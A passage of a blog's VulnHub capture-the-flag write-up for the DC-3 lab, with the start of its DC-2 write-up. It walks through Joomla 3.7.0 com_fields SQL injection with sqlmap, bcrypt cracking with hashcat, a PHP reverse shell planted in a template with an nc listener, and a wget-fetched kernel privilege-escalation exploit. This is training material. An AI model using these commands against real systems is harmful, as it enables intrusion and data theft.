","date":"02-07-2023","objectID":"/dc-3/:0:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"DC-3 Details Dropdown to see DC-3's quick overview DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all. Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools. For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward. For those with experience doing CTF and Boot2Root challenges, this probably won’t take you long at all (in fact, it could take you less than 20 minutes easily). If that’s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag. Details can be found at https://www.five86.com/dc-3.html ","date":"02-07-2023","objectID":"/dc-3/:1:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Obtaining DC-3’s IP \u0026 Set Vars Depending on your lab environment, the way DC-3 is assigned an IP address will vary. In my current layout, I have DC-3 being hosted, through virtualbox, on a host-only adapter. This host-only network has a virtualbox DHCP server running at 192.168.56.100 and this assigns DC-3 it’s IP address: 192.168.56.113. Running sudo netdiscover -i vboxnet0 -r 192.168.56.0/24 provides me the following result. -i vboxnet0 –\u003e is the host-only interface, created by virtualbox, in which DC-3 exists. I then follow up by assigning a few variables and echoing them back to review for syntax errors. netdiscover followed by var assignment \u0026 echo ","date":"02-07-2023","objectID":"/dc-3/:2:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Scanning and Enumeration With DC-3’s IP found and a few environmental variables set, let’s move onto scanning with nmap. ","date":"02-07-2023","objectID":"/dc-3/:3:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Scanning with nmap Let’s see what ports and services may be running on the target(DC-3). nmap $IP -T4 -p- -sC -sV --open $IP –\u003e is the previously exported IP address of DC-3. -T4 –\u003e T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap’s Timing Templates webpage. -p- –\u003e tells nmap to scan ALL 65,535 TCP ports. -sC –\u003e specifies nmap to run default scripts. -A includes this. -sV –\u003e enables version detection. -A includes this. --open –\u003e only shows ports that are “open”. Safe against a purposely vulnerable box. Using -A works too. It includes the two specified options above, plus traceroute. trimmed up nmap results Looks like a Joomla CMS provided by an apache server hosted on Ubuntu. Let’s make some notes and move onto manual inspection. ","date":"02-07-2023","objectID":"/dc-3/:3:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Notes \u0026 Try-List Box Name : DC-3 (DC Series) OS : Ubuntu (Linux) IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v x.x??? Try List –\u003e Manual Inspection(view source, robots.txt, etc) –\u003e fuzz directories/files –\u003e joomscan –\u003e Manual Inspection : Fuzzing Files : Fuzzing Dirs : joomscan results : ","date":"02-07-2023","objectID":"/dc-3/:3:2","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Manual Inspection Browsing to 192.168.56.113 provides us the Joomla home page. QUICK TRY LIST: Default creds? –\u003e Failed admin:admin Username/Email Enum possible? –\u003e Failed. Same responses Robots.txt doesn’t exist. View Page Source –\u003e Nothing worth noting joomla home page Nothing obvious with the manual inspection, so let’s move onto fuzzing directories and files… ","date":"02-07-2023","objectID":"/dc-3/:3:3","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Fuzzing Files Let’s see if the Joomla CMS has any files that are hidden or forgotten… wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 403,404 $URLfile -c –\u003e provides a color output for the webapp’s response column. -z file,/*wordlist* –\u003e specifies payload type and points to file wordlist. --hc 403,404 –\u003e tells wfuzz not to display any 403 or 404 responses. $URLfile –\u003e is the exported variable with no appended backslash, meaning wfuzz will fuzz for files. wfuzz - files Let’s manually visit each recorded response, in our browser, to see what each presents! index.php - that’s the home page… LICENSE.txt - nothing worth notating configuration.php - located in the root directory.. this provides Joomla needed parameters to properly run. db locations, settings, etc BUT we can’t access it. Not helpful for now but maybe we enum once we get access… README.txt - provides a Joomla version of 3.7.0 - add that to our notes! htaccess.txt - file that specifies access control settings Well, we were able to enumerate Joomla’s versioning. 3.7.0! Time to enumerate the directories. ","date":"02-07-2023","objectID":"/dc-3/:3:4","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Fuzzing Directories Just like before but with the $URLdir variable and directories.txt wordlist. We’ll also add the option --hh 31, as this will filter out some responses that have no value to us(blank pages,forbidden,etc). wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 403,404 --hh 31 $URLdir wfuzz - directories Again, just as before. Let’s visit the response…/administrator/ Looks like an admin login page but with no usernames, attempting to login would be a waste. ","date":"02-07-2023","objectID":"/dc-3/:3:5","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Updating our notes Box Name : DC-3 (DC Series) OS : Ubuntu (Linux) IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Try List –\u003e joomscan Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0 Fuzzing Dirs : /administrator/ provides admin login form joomscan : ","date":"02-07-2023","objectID":"/dc-3/:3:6","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Enum/Vuln scan with joomscan joomscan, an OWASP project, is aimed at automating vulnerability detection of Joomla CMS deployments. Please see OWASP’s joomscan github for more information. It’s very simple to run, but let’s go ahead and export an environment variable called URLjoomscan.(It’s good practice, that’s why!) export URLjoomscan=\"http://192.168.56.113/\" Now let’s run joomscan joomscan -u $URLjoomscan We get a version confirmation of 3.7.0. It also shows there’s no Joomla core vulnerability but this isn’t true. The next section will show otherwise. Confirming a tool’s findings is an important step, as you’ll sometimes run into false results! Joomla 3.7.0 and admin login page - confirmed ","date":"02-07-2023","objectID":"/dc-3/:3:7","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Researching Exploits We’re not at a dead-end but since we have a confirmed version of Joomla 3.7.0, let’s go ahead and search exploit-db.com database which is searchable locally using searchsploit. searchsploit (AKA local repo of exploit-db.com) isn’t the only option and shouldn’t be. I don’t document it on these posts, but I do spend time on google researching exploits. Searchsploit isn’t the end all of finding an exploit. There’s many hidden gems out there! See my resources pages for more exploit resources! ","date":"02-07-2023","objectID":"/dc-3/:4:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Searchsploit joomla 3.7 searchsploit joomla 3.7 results in the following(see pic) searchsploit 3.7 results There’s two helpful options we can use to interact with the searchsploit results: -m aka --mirror - this copies an exploit to the current working directory. -x aka --examine - this displays the exploit contents in the terminal. I’ll be using the -m option to copy the file to the current working directory. Since there’s two exploits I’m interested in, I’ll copy each. searchsploit -m php/remote/44227.php \u0026\u0026 searchsploit -m php/webapps/42033.txt After looking at both exploits, the 44227.php file concatenates the joomla database tables for usernames, emails, dbusers, dbnames, dbversion while the 42033.txt file just shows a few SQLi examples. One example is through sqlmap! I want to get more experience using sqlmap, so this will be the path I take. The vulnerability, in Joomla, looks to relate to the exploitable com_fields component being accessible, which allows for SQLi(njection). We’ll be abusing this… You can test for SQL injection by simply running the following in your browser http://*DC-3-IP*/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=%27 If you get this response, then it’s vulnerable to SQLi (SQL Injection)! Confirming SQLi for Joomla 3.7.0 ","date":"02-07-2023","objectID":"/dc-3/:4:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Exploiting Again, I’ll be using sqlmap to dump data from the Joomla SQL DB but feel free to approach this how you’d like! That’s part of the fun! ","date":"02-07-2023","objectID":"/dc-3/:5:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Running sqlmap against Joomla DB File 42033.txt gives us this example to run, so let’s try it out. sqlmap -u \"http://localhost/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] You’ll want to replace “localhost” with DC-3’s IP address. -u –\u003e specifies the URL in which we’re attacking. We need to include the entire syntax of the com_fields address as it’s the exploit we’re abusing. --risk=3 –\u003e basically runs most(loudest) tests. We’re not being stealthy, so it’s OK. --level=5 –\u003e provides us a higher level of verbose --dbs –\u003e Enumerates DBMS databases --p list[fullordering] –\u003e the output format Just hit enter to run defaults if you’re asked any questions during runtime. MySQL - databases mysql confirmed MySQL version \u003e=5.1. Add this to the notes! This results in a list of the databases in the MySQL server. Let’s now specify the database we want to enumerate using the options and value -D joomladb and list out its tables. sqlmap -u \"http://localhost/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering] Remove --dbs and add -D joomladb - this specifies the “joomladb” database we want to query aka “USE DATABASE joomla;” Add --tables –\u003e this basically runs “SHOW tables;” MySQL - joomladb tables It’s a longer list, but we’re seeing a #__users table. Let’s go ahead and --dump it’s data. sqlmap -u \"http://localhost/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent -D joomladb -T \"#__users\" --dump -p list[fullordering] Replace --tables with -T \"#__users\" –\u003e this specifies the table Add option --dump –\u003e this will dump all the data in the #__users table. It might ask “do you want to use common column existence check”.. answer y When asked about which dictionary to use, default #1 is fine. 1 thread is fine. Press enter to run the default speed. MySQL Table Dump! Nice! We end up with a dump showing the details of the username admin, including the password hash! ","date":"02-07-2023","objectID":"/dc-3/:5:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Cracking hashes with hashcat Before we can crack the hash, we need to do two things. Move the hash into a file for hashcat. Figure out what hash algorithm was used. Let’s place $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu into a file, so we can feed it to hashcat echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' \u003e dc-3-mysql-hash-dump.txt After researching the hash on google, I found that hashes starting with $2y$ are bcrypt. We tell hashcat it’s bcrypt with option -m 3200 Now that we know the hashing algorithm and the hash is inside a file, let’s run hashcat! hashcat -m 3200 -a 0 dc-3-mysql-hash-dump.txt /usr/share/wordlists/rockyou.txt -m 3200 –\u003e specifies bcrypt hash algorithm -a 0 –\u003e tells hashcat to run a straight attack, it runs against each word in the dictionary without character alteration *.txt –\u003e is the files containing the hashes /*/wordlist.txt –\u003e specifies the location of the wordlist Username admin hash cracked!! We now have an email, username, and password! Let’s update our notes! Plus MySQL versioning and potential username:freddy. ","date":"02-07-2023","objectID":"/dc-3/:5:2","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Updating our notes again Box Name : DC-3 (DC Series) OS : Ubuntu (Linux) IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0 Fuzzing Dirs : /administrator/ provides admin login form joomscan : confirmed versioning 3.7.0 ADDITIONAL SERVICES MySQL - \u003e= 5.1 EMAILS freddy@norealaddress[.]net CREDENTIALS admin:snoopy - Joomla POTENTIAL USERNAMES freddy ","date":"02-07-2023","objectID":"/dc-3/:5:3","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Logging into Joomla as admin Head to /administrator/ login form and use our newly cracked password –\u003e admin:snoopy. Logged in as admin - Joomla We’re now logged into Joomla as admin! At this point, it’s good to look around the admin panel to see what there is to notate. Versions? Other users? Anything! A good place to start, with Joomla, is in the System \u003e System Information panel Joomla’s configuration panel Although a back burner item, notating the kernel version is important as it may be the last easy way to gaining privesc. I found the following information and added them to the notes. Kernel –\u003e Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 Ubuntu –\u003e 5.7.25-0ubuntu0.16.04.2 PHP Version –\u003e 7.0.33-0ubuntu0.16.04.2 Apache –\u003e Apache/2.4.18 (Ubuntu) Server API–\u003e Apache2Handler 20120211 Zend Engine –\u003e v3.0.0 MySQL –\u003e 5.0.12-dev OpenSSL –\u003e 1.0.2g Box Name : DC-3 (DC Series) Kernel/OS : Ubuntu (Linux) Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 – 5.7.25-0ubuntu0.16.04.2 IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0 Fuzzing Dirs : /administrator/ provides admin login form joomscan : confirmed versioning 3.7.0 ADDITIONAL SERVICES MySQL –\u003e 5.0.12-dev PHP –\u003e 7.0.33-0ubuntu0.16.04.2 Apache2Handler –\u003e 20120211 Zend Engine –\u003e 3.0.0 OpenSSL –\u003e 1.0.2g EMAILS freddy@norealaddress[.]net CREDENTIALS admin:snoopy - Joomla POTENTIAL USERNAMES freddy Now that we have admin access, will it allow us to inject malicious php code into the php forms? ","date":"02-07-2023","objectID":"/dc-3/:5:4","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"reverse-shell against a template I quickly found two possible ways to gain reverse shells through PHP. Upload option located at Content \u003e Media (there may be upload restrictions you have to get around. See Content \u003e Media \u003e Options) php templates in Extension \u003e Templates \u003e Templates With the Content \u003e Media option, you’d want to upload the reverse shell(revshell) then somehow execute it.. This can be done by visiting the file by simply accessing it e.g. http://192.168.56.113/images/malicious-file.extension Option two is done by simply pasting pentestmonkey’s php-revshell code into a template and previewing it. aka the contents of the .php file you’d use for option #1 is executed when Joomla previews(executes) the code. I’ll go the template route. Navigate to the Beez3 template by Extensions \u003e Templates \u003e Templates \u003e Beez3 Details and Files index.php then paste revshell over the existing data. Edit the $ip and $port variables to match your attack system’s IP and the port you’d like to use. e.g. 1234. ⚠️ DO NOT SAVE \u0026 PREVIEW the template yet! Netcat needs configured PHP revshell configured and ready! Now it’s time to setup netcat, so it’s listening on the port you previously specified in the php template. Open another terminal tab and run: nc -nvlp 1234 n –\u003e uses IP addressing and not DNS v –\u003e verbose mode l –\u003e tells nc to listen p –\u003e specifies the port e.g. 1234 Now that we have nc listening, it’s time to get a revshell! Jump back to Joomla and click “Save \u0026 Close” followed by clicking “Template Preview”. We have remote shell! Successful revshell ","date":"02-07-2023","objectID":"/dc-3/:5:5","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Post-Exploitation Now that we have a revshell, we’ll want to establish a stable shell that has tty and continue enumeration, search for privesc exploits/abuses, and finally gain root. ","date":"02-07-2023","objectID":"/dc-3/:6:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Upgrading shell incl. tty Let’s check for tty. Nope. Let’s check for restricted shell by running a few commands… ls cd / echo. No rbash! So let’s get us a stable shell with tty. Thanks to S1ren’s blog! Let’s check for python… with which python. Sweet. Let’s spawn a python shell! python -c 'import pty; pty.spawn(\"/bin/bash\")' - this spawns a bash shell, with tty, through python Now let’s set PATH variables, output color, and an alias. export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp –\u003e export variables export TERM=xterm-256color –\u003e color in terminal alias ll='ls -lsaht --color=auto' –\u003e ll runs ls -lsaht Press Ctrl + Z to make our zhs shell a background process through netcat(nc) stty raw -echo;fg;reset then enter twice –\u003e input and output is not processed, e.g. can’t cancel shell by CTRL+C, then opens background shell with reset stty columns 200 rows 200 –\u003e this sets columns and rows to max on terminal output Now CTRL+C won’t disconnect us and we have nice terminal output. 😃 A stable python spawned bash shell with tty ","date":"02-07-2023","objectID":"/dc-3/:6:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Checking for sudo privs Let’s see if we have sudo privs by running sudo -l.. well it’s asking for a password and snoopy does not work. So, we’ll either need to find user www-data’s password or find another privesc path. ","date":"02-07-2023","objectID":"/dc-3/:6:2","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"enum /etc/shadow \u0026 /etc/passwd Let’s see if we have access to cat /etc/shadow or cat /etc/passwd. Denied access to shadow but we have access to passwd. user dc3 found In linux, user created users start with an ID of 1000. e.g. 1000 and 1001 would indicate two users NOT including root. Root is always ID 0. Looks like we have a user to add to our notes: dc3 ","date":"02-07-2023","objectID":"/dc-3/:6:3","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Searching binaries w/ SUID bit set The SUID, Set User ID, is a feature that allows a binary to run under the permissions of another user. The abuse comes from administrators setting the SUID bit on binaries that are abusable and share root permissions. After we find the SUID binaries, we check them for abuse through an online reference like GTFOBins. To search the target for binaries which have the SUID bit set, we’ll run the following command: find / -perm -u=s -type f 2\u003e/dev/null find / –\u003e searches the root directory where the… -perm -u=s –\u003e permission, for the current user, is set to s “sticky bit” -type f –\u003e to only list files 2\u003e/dev/null –\u003e redirects any errors to a black hole in space 😁 SUID set binaries The at binary is abusable for privesc BUT it requires the user to have SUDO privs to the file and not SUID, so this is a dead end since we lack SUDO privs. ","date":"02-07-2023","objectID":"/dc-3/:6:4","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Looking for abusable cron jobs Let’s see what processes are running as ‘root’ by executing the following: ps -U root -u root u this shows every process running as root in user format. Pulled from ps man page. cron running as root I looked for anything abusable running under a cronjob but there was nothing. ","date":"02-07-2023","objectID":"/dc-3/:6:5","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Digging into /html root Let’s see if Joomla’s configuration file holds anything special… cat /var/www/html/configuration.php Looks like we found the root MySQL database password! root:squires MySQL creds found ","date":"02-07-2023","objectID":"/dc-3/:6:6","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Accessing MySQL db mysql -uroot -psquires We end up having root access to the MySQL database but nothing of value was found. ","date":"02-07-2023","objectID":"/dc-3/:6:7","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Updating \u0026 Reviewing Notes I tried using all combinations of username/passwords for su and got nowhere. The only other thing to check is the kernel. It may be exploitable. At this point, let’s gather all the kernel/OS info and add it to our notes, or confirm what we already have, so we can find the best possible exploit. file /bin/bash cat /etc/*-release uname -a This results in the following: Kernel \u0026 OS Info Box Name : DC-3 (DC Series) OS/Bit/Kernel : Ubuntu (Linux) 16.04, 32-bit LSB, 4.4.0-21-generic kernel IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0 Fuzzing Dirs : /administrator/ provides admin login form joomscan : confirmed versioning 3.7.0 exfil of admin credentials via SQL injection command execution through php to gain remote shell ADDITIONAL SERVICES MySQL –\u003e 5.0.12-dev PHP –\u003e 7.0.33-0ubuntu0.16.04.2 Apache2Handler –\u003e 20120211 Zend Engine –\u003e 3.0.0 OpenSSL –\u003e 1.0.2g EMAILS freddy@norealaddress[.]net CREDENTIALS admin:snoopy - Joomla root:squires - MySQL POTENTIAL USERNAMES freddy , dc3 ","date":"02-07-2023","objectID":"/dc-3/:6:8","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Gaining root! The plan: We’re going to searchsploit, look for an exploit, figure out how to execute the exploit, execute the exploit, and hopefully gain root! ","date":"02-07-2023","objectID":"/dc-3/:7:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Searchsploit per OS/Kernel We’re going searchsploit the OS and kernel versions for any exploit that may give us privilege escalation, making sure it’s not a 64-bit exploit. searchsploit is picky with syntax. If you include too much in your search query, you might miss out on a result. e.g. searchsploit 4.4.0 may miss out on the result of 4.4.x since 0 was specified. Let’s run searchsploit ubuntu 16.04 4.4 priv esc This will look for any exploits that include ubuntu + 16.04 + 4.4 + priv + esc and we get the following results! searchsploit kernel exploit results I’m going to choose the linux/local/39772.txt and the chances of it working increase when seeing a “x” in the kernel results 4.4.*x*. Let’s copy the text file over to our current working directory. Since searchsploit copies files to the current working directory, please cd into desired directory before running: searchsploit -m linux/local/39772.txt. Now let’s nano 39772.txt to see the details of the exploit like what needs configured(if needed), how to execute, etc It looks like we need access to the following binaries, on the target machine, in order to execute the exploit. which wget –\u003e Found it! To transfer the exploit from attackbox to the target. which unzip –\u003e Found it! To unzip the 39772.zip file. which tar –\u003e Found it! To untar the exploit.tar file. which cc –\u003e Found it! To compile the *.c files. Sweet! We’re good to transfer, compile, and run the exploit. Let’s download the exploit to our attackbox. 😁 wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip I use vim to look inside the zip file and it holds the *.tar file needed to exploit the target: exploit.tar. The crasher.tar is the PoC, and is NOT needed. Good to know as we’ll need to unzip this archive, once on the target, and compile the exploit to run. Contents of 39772.zip Let’s now move onto transferring the exploit and executing it! ","date":"02-07-2023","objectID":"/dc-3/:7:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Transferring the exploit On the attackbox’s terminal, you’ll want to start up a http server, or any other quick file host app, to host the exploit, so the target can download it. I do this with python. python -m http.server –\u003e this will run a http server within the current working directory which is where I downloaded the 39772.zip file. Let’s hop back onto the target’s terminal and cd /var/tmp. I choose /var/tmp as it’ll preserve our exploit through reboots. I’m doing this in case the system crashes and its needed for a second run. Normally, we place exploits in /tmp since it’s cleared at reboot. When it comes to pentests, it’s important to clean up after yourself and revert any settings/changes that were made. Unless specified, you never want to leave changes in place as it might alter the operations of the business. Once in /var/tmp, we run the following to download the exploit from the attackbox. wget http://192.168.56.1:8000/39772.zip wget –\u003e is a simple network downloader that exists on most standard linux distros. http://192.168.56.1:8000/ –\u003e is my attackbox’s IP, along with the default port http.server uses 39772.zip –\u003e is the exploit we downloaded earlier. Here’s a successful transfer, of 39772.zip, from the attackbox to the target. Attackbox - file transfer successful 200 Targetbox - file transfer successful We can now ll, on the target’s terminal, and see that we have the file in the current working directory. ","date":"02-07-2023","objectID":"/dc-3/:7:2","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Exploiting Kernel 4.4.0-21-generic! Now that we have the kernel exploit on the target machine, we’re set to extract, compile, and execute. unzip 39772.zip –\u003e unzip folder’s contents into a folder with the same name “39772” cd 39772 –\u003e will change working directory into the “39722” folder, which contains the tar files ll –\u003e will show the two files, but we’ll only need to untar the exploit.tar file. tar -xvf exploit.tar –\u003e this untars the exploit.tar file. ll again –\u003e you’ll see a folder called “ebpf_mapfd_doubleput_exploit” cd ebpf_mapfd_doubleput_exploit –\u003e change directory into ebpf_mapfd_doubleput_exploit folder ll again –\u003e you’ll see a compile.sh file. This is the file that’ll compile, using cc, the exploit that we’ll execute. ./compile.sh –\u003e You may see some errors, and since they’re non critical we’ll ignore them. ll again –\u003e you should see a few new files. suidhelper, doubleput, and hello. exploit ready for execution! Now we have an exploit, called doubleput, that’s ready to be executed!! Let’s get to it already! ./doubleput –\u003e executes the exploit…. and… ","date":"02-07-2023","objectID":"/dc-3/:7:3","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"ROOTED!! ROOT GAINED!!! ","date":"02-07-2023","objectID":"/dc-3/:8:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Updating notes incl. attack process! Box Name : DC-3 (DC Series) OS/Bit/Kernel : Ubuntu (Linux) 16.04, 32-bit LSB, 4.4.0-21-generic kernel Priviledge Escalation gained by exploiting vulnerability in Linux Kernel 4.4.0-21-generic. Exploit used = Linux Kernel 4.4.x (Ubuntu 16.04) - ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0(Info Disclosure) Fuzzing Dirs : /administrator/ provides admin login form joomscan : confirmed versioning 3.7.0 Exfil of Joomla’s admin hashed credential, through a SQL injection vulnerability in Joomla’s Core (Exploit used = Joomla! 3.7.0 - ‘com_fields’ SQL Injection), granted admin access to Joomla’s admin panel which allowed for remote code execution resulting in a reverse shell to DC-3. This php revshell RCE was accomplished through Joomla’s php templates. Once the reverse shell was established, we gained full access to the MySQL database after finding clear text root MySQL credentials within Joomla’s configuration file. To gain root privileges, we exploited DC-3’s vulnererable linux kernel by the above listed exploit, ‘double-fdput()’ ADDITIONAL SERVICES MySQL –\u003e 5.0.12-dev PHP –\u003e 7.0.33-0ubuntu0.16.04.2 Apache2Handler –\u003e 20120211 Zend Engine –\u003e 3.0.0 OpenSSL –\u003e 1.0.2g EMAILS freddy@norealaddress[.]net CREDENTIALS admin:snoopy - Joomla root:squires - MySQL USERNAMES dc3 - DC-3 ID=1000 POTENTIAL USERNAMES freddy ","date":"02-07-2023","objectID":"/dc-3/:8:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Thanks for visiting! I hope you enjoyed DC-3. Next, DC-4! ","date":"02-07-2023","objectID":"/dc-3/:9:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"DC-2 from the DC-Series(VulnHub).","date":"01-31-2023","objectID":"/dc-2/","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"With DC-1 out of the way, let’s move onto DC-2 of the DC Series! ","date":"01-31-2023","objectID":"/dc-2/:0:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"DC-2 Details Click here to see DC-2's quick overview. Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. As with the original DC-1, it’s designed with beginners in mind. Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools. Just like with DC-1, there are five flags including the final flag. And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience. In short, the only flag that really counts, is the final flag. For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc. I haven’t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install. Further details can be found at https://www.five86.com/dc-2.html. ","date":"01-31-2023","objectID":"/dc-2/:1:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Finding DC-2’s IP Once you’ve imported, configured, and started the DC-2 VM, let’s acquire its IP by running sudo netdiscover -r *IP*/*CIDR* from our attack box’s terminal. -r specifies the IP range by IP/CIDR notation. (There’s always another way to reach a similar outcome, so feel free to use your own techniques/tools to acquire DC-2’s IP address.) If you see two asterisks surrounding some characters, like *IP*, removal of the asterisks and inserting the appropriate characters is needed. In this case, *IP* and *CIDR* need replaced by the IP address(e.g. 192.168.56.0) and subnet mask shorthand via CIDR(/24), in which DC-2 exists, respectively. Depending on my attack system’s interface/routing configuration, I may have to run the netdiscover command with the -i option. -i specifies which interface I want the ARP requests to be sent through. As I’m running multiple NICs, a VPN, and virtualbox, on this particular attack box, I have to run the following command to grab DC-2’s IP: sudo netdiscover -i vboxnet0 -r 192.168.56.0/24 PS You’ll need to CTRL+C to exit netdiscover. netdiscover tool - *.100 is the virtualbox DHCP server while *.111 is DC-2 Now that we have DC-2’s IP address, let’s move onto setting up environment variables through the attack box’s terminal. ","date":"01-31-2023","objectID":"/dc-2/:2:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Exporting Environment Variables To speed up a few future commands, let’s export a few environment variables to include the IP address we obtained earlier. export IP=\"*IP*\" –\u003e This will create a variable, named $IP, containing DC-2’s IP address. - e.g. export IP=\"192.168.56.111\" export URLdir=\"http://*IP*/FUZZ/\" –\u003e Variable for 